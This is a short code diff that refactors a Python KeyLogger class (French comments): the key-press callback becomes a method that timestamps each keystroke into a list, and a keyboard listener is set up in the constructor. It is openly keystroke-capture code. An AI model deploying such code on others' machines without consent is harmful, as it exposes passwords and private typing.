@@ -11,14 +11,13 @@ class KeyLogger:
         Un keylogger stock les logs d'inputs reçu dans une liste keys
         """
         self.keys = []
+        self.listener = keyboard.Listener(on_press=self.on_press)
 
-        def on_press(key):
+    def on_press(self,key):
             log = str(datetime.now().time()) + " " + str(key)
             log=log.replace("'","")
             log=log.replace('"',"")
             self.keys.append(log)
-
-        self.listener = keyboard.Listener(on_press=on_press)
 
     def write_on_file(self,filename):
             with open(filename,'w') as f:
